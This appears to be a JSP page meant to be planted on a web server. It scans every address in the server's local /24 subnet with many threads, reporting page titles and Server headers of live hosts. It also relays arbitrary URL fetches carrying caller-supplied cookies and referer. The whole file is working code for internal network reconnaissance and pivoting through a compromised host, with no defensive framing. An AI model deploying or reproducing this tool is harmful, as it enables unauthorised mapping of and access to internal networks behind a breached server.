<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%@ page isThreadSafe="false"%>
<%@page import="java.io.PrintWriter"%>
<%@page import="java.io.OutputStreamWriter"%>
<%@page import="java.util.regex.Matcher"%>
<%@page import="java.io.IOException"%>
<%@page import="java.net.InetAddress"%>
<%@page import="java.util.regex.Pattern"%>
<%@page import="java.net.HttpURLConnection"%>
<%@page import="java.util.concurrent.LinkedBlockingQueue"%>

<%!final static List<String> list = new ArrayList<String>();
//POST: ip=127.0.0.1&url=url&thread＝10&decode＝gbk&referer=&cookie=
	String referer = "";
	String cookie = "";
	String decode = "utf-8";
	int thread = 100;

	HttpURLConnection getHTTPConn(String urlString) {
		try {
			java.net.URL url = new java.net.URL(urlString);
			java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url
					.openConnection();
			conn.setRequestMethod("GET");
			conn.addRequestProperty("User-Agent",
					"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon;)");
			conn.addRequestProperty("Accept-Encoding", "gzip");
			conn.addRequestProperty("referer", referer);
			conn.addRequestProperty("cookie", cookie);
			//conn.setInstanceFollowRedirects(false);
			conn.setConnectTimeout(3000);
			conn.setReadTimeout(3000);

			return conn;
		} catch (Exception e) {
			return null;
		}
	}

	HttpURLConnection conn;

	String getHtmlContext(HttpURLConnection conn, String decode) {
		Map<String, Object> result = new HashMap<String, Object>();
		try {

			String code = "utf-8";
			if (decode != null) {
				code = decode;
			}
			StringBuffer html = new StringBuffer();
			java.io.InputStreamReader isr = new java.io.InputStreamReader(
					conn.getInputStream(), code);
			java.io.BufferedReader br = new java.io.BufferedReader(isr);

			String temp;
			while ((temp = br.readLine()) != null) {
				if (!temp.trim().equals("")) {
					html.append(temp).append("\n");
				}
			}
			br.close();
			isr.close();
			return html.toString();
		} catch (Exception e) {
			System.out.println("getHtmlContext:"+e.getMessage());
			return "null";
		}
	}

	String getServerType(HttpURLConnection conn) {
		try {
			return conn.getHeaderField("Server");
		} catch (Exception e) {
			return "null";
		}

	}

	String getTitle(String htmlSource) {
		try {
			List<String> list = new ArrayList<String>();
			String title = "";
			Pattern pa = Pattern.compile("<title>.*?</title>");
			Matcher ma = pa.matcher(htmlSource);
			while (ma.find()) {
				list.add(ma.group());
			}
			for (int i = 0; i < list.size(); i++) {
				title = title + list.get(i);
			}
			return title.replaceAll("<.*?>", "");
		} catch (Exception e) {
			return null;
		}
	}

	List<String> getCss(String html, String url, String decode) {
		List<String> cssurl = new ArrayList<String>();
		List<String> csscode = new ArrayList<String>();
		try {

			String title = "";
			Pattern pa = Pattern.compile(".*href=\"(.*)[.]css");
			Matcher ma = pa.matcher(html.toLowerCase());
			while (ma.find()) {
				cssurl.add(ma.group(1) + ".css");
			}

			for (int i = 0; i < cssurl.size(); i++) {
				String cssuuu = url + "/" + cssurl.get(i);
				String csshtml = "<style>"
						+ getHtmlContext(getHTTPConn(cssuuu), decode)
						+ "</style>";
				csscode.add(csshtml);

			}
		} catch (Exception e) {
			System.out.println("getCss:"+e.getMessage());
		}
		return csscode;

	}

	String getMyIPLocal() throws IOException {
		InetAddress ia = InetAddress.getLocalHost();
		return ia.getHostAddress();
	}%>
<%
	String u = request.getParameter("url");
	String ip = request.getParameter("ip");

	if (u != null) {
		decode = request.getParameter("decode");
		String ref = request.getParameter("referer");
		String cook = request.getParameter("cookie");
		if (ref != null) {
			referer = ref;
		}
		if (cook != null) {
			cookie = cook;
		}
		String html = getHtmlContext(getHTTPConn(u), decode);
		List<String> css = getCss(html, u, decode);
		String csshtml = "";
		if (!html.equals("null")) {

			for (int i = 0; i < css.size(); i++) {
				csshtml += css.get(i);
			}
			out.print(html + csshtml);
		} else {
			response.setStatus(HttpServletResponse.SC_NOT_FOUND);
			out.print("请求失败！");
		}

		return;
	}

	else if (ip != null || u == null) {
		String threadpp = (request.getParameter("thread"));
		if (threadpp != null) {
			thread = Integer.parseInt(threadpp);
			System.out.println(threadpp);
		}
		try {
			try {
				String http = "http://";
				String localIP = getMyIPLocal();
				if (ip != null) {
					localIP = ip;
				}
				String useIP = localIP.substring(0,
						localIP.lastIndexOf(".") + 1);
				final Queue<String> queue = new LinkedBlockingQueue<String>();
				for (int i = 1; i <= 256; i++) {
					String url = http + useIP + i;
					queue.offer(url);
				}
				final JspWriter pw = out;
				ThreadGroup tg = new ThreadGroup("c");
				for (int i = 0; i < thread; i++) {
					new Thread(tg, new Runnable() {
						public void run() {
							while (true) {
								String addr = queue.poll();
								if (addr != null) {
									System.out.println(addr);
									HttpURLConnection conn = getHTTPConn(addr);
									String html = getHtmlContext(conn,
											decode);
									String title = getTitle(html);
									String serverType = getServerType(conn);
									String status = !html
											.equals("null") ? "Success"
											: "Fail";
									if (html != null
											&& !status.equals("Fail")) {
										try {
											pw.println(addr + "  >>  "+ title + ">>"+ serverType+ " >>" + status+ "<br/>");
										} catch (Exception e) {
											e.printStackTrace();
										}
									}
								} else {
									return;
								}
							}
						}
					}).start();
				}
				while (tg.activeCount() != 0) {
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		} catch (Exception e) {
			out.println(e.toString());
		}
	}
%>